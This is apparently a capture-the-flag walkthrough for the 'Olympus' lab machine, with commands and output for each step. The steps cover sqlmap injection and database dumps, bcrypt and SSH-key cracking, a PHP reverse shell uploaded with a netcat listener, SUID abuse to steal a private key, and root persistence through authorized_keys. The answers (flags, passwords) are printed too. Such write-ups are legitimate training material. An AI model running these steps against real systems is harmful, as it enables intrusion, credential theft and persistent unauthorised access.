# Olympus


1. Run a port scan with Rustscan.
```
root@ip-10-10-201-175:~# rustscan -r 1-65535 -a 10.10.131.163
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.\U0001f422

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.131.163:22
Open 10.10.131.163:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-16 19:55 UTC
Initiating Ping Scan at 19:55
Scanning 10.10.131.163 [2 ports]
Completed Ping Scan at 19:55, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:55
Completed Parallel DNS resolution of 1 host. at 19:55, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:55
Scanning ip-10-10-131-163.eu-west-1.compute.internal (10.10.131.163) [2 ports]
Discovered open port 80/tcp on 10.10.131.163
Discovered open port 22/tcp on 10.10.131.163
Completed Connect Scan at 19:55, 0.00s elapsed (2 total ports)
Nmap scan report for ip-10-10-131-163.eu-west-1.compute.internal (10.10.131.163)
Host is up, received syn-ack (0.00050s latency).
Scanned at 2022-07-16 19:55:46 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

2. The webpage on `http://<ip address>:80` doesn't seem to load but we see that it's redirecting us to `olympus.thm`. Add the domain to `/etc/hosts`. Now when we access it we see that the old version of the page is still available somewhere.
```
10.10.131.163   olympus.thm
```

3. Look for directories with Gobuster. Look through the directories and we find that `~webmaster` contains the old webpage. Then run Gobuster again on `~webmaster`.
```
root@ip-10-10-201-175:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://olympus.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/07/16 21:07:23 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/~webmaster (Status: 301)
/index.php (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 403)
/server-status (Status: 403)
/static (Status: 301)
===============================================================
2022/07/16 21:07:23 Finished
===============================================================
```
```
root@ip-10-10-255-44:~/Downloads# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://olympus.thm/~webmaster/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/07/16 23:50:44 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/img (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/LICENSE (Status: 200)
===============================================================
2022/07/16 23:50:45 Finished
===============================================================
```

4. The website is using `Victor CMS`, and we find that there's a [SQLi vulnerability on the CMS](https://github.com/BigTiger2020/Victor-CMS-/blob/main/README.md). Use Sqlmap to confirm it. Then dump the database with Sqlmap.
```
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dump
```

5. We find chats, password hashes, and the first flag, `flag{Sm4rt!_k33P_d1gGIng}`.
```
Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

[23:04:57] [INFO] table 'olympus.chats' dumped to CSV file '/root/.sqlmap/output/olympus.thm/dump/olympus/chats.csv'
[23:04:57] [INFO] fetching columns for table 'users' in database 'olympus'
[23:04:57] [INFO] fetching entries for table 'users' in database 'olympus'
Database: olympus
Table: users
[3 entries]
+---------+----------+-----------+------------+------------+------------------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_role | user_name  | user_image | user_email             | user_lastname | user_password                                                | user_firstname |
+---------+----------+-----------+------------+------------+------------------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | User      | prometheus | <blank>    | prometheus@olympus.thm | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | Admin     | root       | <blank>    | root@chat.olympus.thm  | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | User      | zeus       | <blank>    | zeus@chat.olympus.thm  | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+-----------+------------+------------+------------------------+---------------+--------------------------------------------------------------+----------------+

[23:04:57] [INFO] table 'olympus.users' dumped to CSV file '/root/.sqlmap/output/olympus.thm/dump/olympus/users.csv'
[23:04:57] [INFO] fetching columns for table 'posts' in database 'olympus'
[23:04:57] [INFO] fetching entries for table 'posts' in database 'olympus'
Database: olympus
Table: posts
[3 entries]
+---------+------------------+------------+-------------------------+----------------------+-----------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| post_id | post_category_id | post_date  | post_tags               | post_title           | post_image      | post_status | post_author | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | post_comment_count |
+---------+------------------+------------+-------------------------+----------------------+-----------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| 2       | 1                | 2022-04-22 | first, post             | Dear Gods and Godess | img.jpg         | publish     | root        | <div class="wp-container-7 entry-content wp-block-post-content" style="text-align: center;">\r\n<p><strong>This is the first version of the Olympus website. It should become a platform for each and everyone of you to express their needs and desires. Humans should not be allowed to visit it.</strong></p>\r\n<p><strong>You have all been sent a username and a password (that you will need to change ASAP) that will allow you to join the Olympus and create articles.</strong></p>\r\n<p><strong>I hope you will like this website,</strong></p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>[23:04:57] [WARNING] writing binary ('application/octet-stream') content to file '/root/.sqlmap/output/olympus.thm/dump/olympus/post_content-43202549.bin' 
| <blank>            |
| 3       | 1                | 2022-04-27 | credentials,security,it | Credentials          | 61X1U2-xUTL.jpg | publish     | root        | <p><strong>Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.</strong></p>\r\n<p><strong>As I remind you, we have a wordlist of forbidden password that you should use. </strong></p>\r\n<p><strong>Please update your passwords.</strong></p>\r\n<p>\xa0</p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>                                                                                                                                                                                                                                       [23:04:57] [WARNING] writing binary ('application/octet-stream') content to file '/root/.sqlmap/output/olympus.thm/dump/olympus/post_content-56612837.bin' 
| <blank>            |
| 6       | 1                | 2022-05-06 | update                  | Update is comming    | <blank>         | publish     | root        | <p style="text-align: center;"><strong>Dear gods and goddess,</strong><br /><strong>Once more, your IT god snapped his finger and here it goes :</strong><br /><strong>Olympus becomes something else, something bigger, something better.</strong><br /><strong>You will find every instruction, should you need them, here.</strong><br /><br /><strong>HOWEVER, DO NOT FORGET TO UPDATE YOUR E-MAIL ON YOUR ACCOUNT PROFILE.</strong><br /><br /><strong>root@the-it-department</strong> </p>                                                                                                                                                                   | <blank>            |
+---------+------------------+------------+-------------------------+----------------------+-----------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+

[23:04:57] [INFO] table 'olympus.posts' dumped to CSV file '/root/.sqlmap/output/olympus.thm/dump/olympus/posts.csv'
[23:04:57] [INFO] fetching columns for table 'comments' in database 'olympus'
[23:04:57] [INFO] fetching entries for table 'comments' in database 'olympus'
Database: olympus
Table: comments
[1 entry]
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| comment_id | comment_post_id | comment_date | comment_email | comment_author | comment_status | comment_content                                                                                                                                                           |
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1          | 2               | 2022-05-03   | <blank>       | prometheus     | approved       | Heyyy ! You've done a damn good but unsecured job ^^\r\n\r\nI've patched a few things on my way, but I managed to hack my self into the olympus !\r\n\r\ncheerio ! \r\n=P |
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[23:04:57] [INFO] table 'olympus.comments' dumped to CSV file '/root/.sqlmap/output/olympus.thm/dump/olympus/comments.csv'
[23:04:57] [INFO] fetching columns for table 'flag' in database 'olympus'
[23:04:57] [INFO] fetching entries for table 'flag' in database 'olympus'
[23:04:57] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[23:04:57] [INFO] used SQL query returns 1 entries
[23:04:57] [INFO] used SQL query returns 1 entries
[23:04:57] [INFO] retrieved: flag{Sm4rt!_k33P_d1gGIng}
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+

[23:04:57] [INFO] table 'olympus.flag' dumped to CSV file '/root/.sqlmap/output/olympus.thm/dump/olympus/flag.csv'
[23:04:57] [INFO] fetching columns for table 'categories' in database 'olympus'
[23:04:57] [INFO] fetching entries for table 'categories' in database 'olympus'
Database: olympus
Table: categories
[5 entries]
+--------+------------+
| cat_id | cat_title  |
+--------+------------+
| 1      | News       |
| 2      | Technology |
| 3      | Tutorials  |
| 7      | Business   |
| 8      | Education  |
+--------+------------+

[23:04:57] [INFO] table 'olympus.categories' dumped to CSV file '/root/.sqlmap/output/olympus.thm/dump/olympus/categories.csv'
[23:04:57] [INFO] fetched data logged to text files under '/root/.sqlmap/output/olympus.thm'

[*] shutting down at 23:04:57
```

6. Try to crack the hashes, we only have any luck on the one for `prometheus`. Try to ssh into the machine as `prometheus`, but the password doesn't grant us access.
```
root@ip-10-10-252-77:~/Downloads# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (?)
1g 0:00:01:01 DONE (2022-07-19 19:56) 0.01633g/s 65.55p/s 65.55c/s 65.55C/s 19861986..543210
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

7. Login as `prometheus` through the login widget on the website. Nothing seems to stand out.

8. We see from the `users` table we dumped that some emails had another subdomain `root@chat.olympus.thm`. Add it to `/etc/hosts`, then navigate to it and login as `prometheus`.
```
10.10.99.41     chat.olympus.thm
```

9. Run Gobuster on `http://chat.olympus.thm` and find an `uploads` folder, but it's blank.
```
root@ip-10-10-252-77:~/Downloads# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://chat.olympus.thm/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://chat.olympus.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/07/19 20:45:57 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 302)
/javascript (Status: 301)
/phpmyadmin (Status: 403)
/server-status (Status: 403)
/static (Status: 301)
/uploads (Status: 301)
===============================================================
2022/07/19 20:45:58 Finished
===============================================================
```

10. We know from the chats table that the names of the files sent are randomized, just like the name of the file `prometheus_password.txt`. If we try to access it at `http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt`, we find that we're able to view it. To exploit this, we can download the pentestmonkey php reverse shell, change the ip and port, and then send it as an attachment. Then run the SQli from step 4 again and we should see the randomized file name of the reverse shell we uploaded. Then simple start a netcat listener with `nc -nvlp <port>` and run the reverse shell with `http://chat.olympus.thm/uploads/<randomized file name>`. We should get a shell as `www-data`.
```
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
```

11. Navigate to `zeus` home directory and find the second flag `flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}`. Another file `zeus.txt` has a message from Prometheus.
```
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



						- Prometheus.
```

12. Download Linpeas onto your machine, set up an http server with `python3 -m http.server`, download it onto the victim with `wget`, give the script executable permissions with `chmod +x`, and run it.

13. Out of all the SUID files, only one is created by `zeus` and belongs to the `zeus` group. Because it's a SUID file we can run it as `zeus`. Once we run it we find that we can copy files. Using this, we can copy the `zeus` ssh private key file and view it.
```
-rwsr-xr-x 1 zeus zeus 18K Apr 18 09:27 /usr/bin/cputils (Unknown SUID binary)
```
```
www-data@olympus:/tmp$ cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: id_rsa

File copied successfully.
```

14. If we try to ssh as `zeus` we find that it's protected with a passphrase. Download `ssh2john.py` and create a hash with `python3 ssh2john.py id_rsa > hash`. Then crack it with `john --wordlist=/usr/share/wordlists/rockyou.txt hash` and find that the passphrase is `snowflake`.

15. Run Linpeas again as zues. We find a few interesting files that are a part of the `zeus` group. Navigate to `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc` and we find that `VIGQFQFMYOST.php` is a php page that gives us a reverse shell. Navigate to it with `http://<ip address>//0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php` and use the password inside the file `a7c5ffcf139742f52a5267c4a0674129` to get a reverse shell as root.
```
Group zeus:
/tmp/linpeas.sh
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
```
```
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{D4mN!_Y0u_G0T_m3_:)_}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```

16. Generate ssh keys on your machine, paste your public key in the `authorized_keys` file of the victim, and then login as root. Search all files for `flag{` and find that the last flag is `flag{y0u_G0t_m3_g00d!}`.
